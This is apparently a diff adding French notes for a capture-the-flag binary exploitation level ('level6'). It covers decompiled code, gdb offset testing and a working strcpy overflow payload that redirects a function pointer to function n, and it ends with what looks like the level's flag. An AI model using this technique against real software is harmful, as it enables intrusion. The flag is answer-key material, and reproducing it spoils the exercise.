@@ -1,0 +1,42 @@
+level6 : 
+
+idée : écrire l'adresse de la fonction n dans la return adresse 
+address de la fonction n : 
+0x8048454 <n>:	0x83e58955
+→ \x54\x84\x04\x08
+
+void main(undefined4 param_1,int param_2)
+{
+  char *__dest;
+  code **ppcVar1;
+  
+  __dest = (char *)malloc(0x40);
+  ppcVar1 = (code **)malloc(4);
+  *ppcVar1 = m;
+  strcpy(__dest,*(char **)(param_2 + 4)); → argv[1]
+  (**ppcVar1)();
+  return;
+}
+
+pour rappel : 
+char *strcpy(char *restrict dest, const char *src);
+
+*(char **)(param_2 + 4) (argv[1]) est copiée dans __dest : 
+Le buffer __dest fait 64 (0x40)
+https://pointerless.wordpress.com/2012/02/26/strcpy-security-exploit-how-to-easily-buffer-overflow/
+
+64 char A
+pas de seg
+
+68 char A
+pas de seg
+
+72 char A → seg, on rajoute 4 A dans gdb
+(gdb) run   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA → 0x41414141 in ?? ()
+
+72 char → Confirmation avec BBBB
+(gdb) run   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB → 0x42424242 in ?? ()
+
+./level6 $(python -c "print 'A'*64 + '\x54\x84\x04\x08' * 3") →$() = contenu de l'exécution du script python. * 3 = 2 fois pour combler de 64 à 68 puis 1 fois pour écraser la return adresse
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
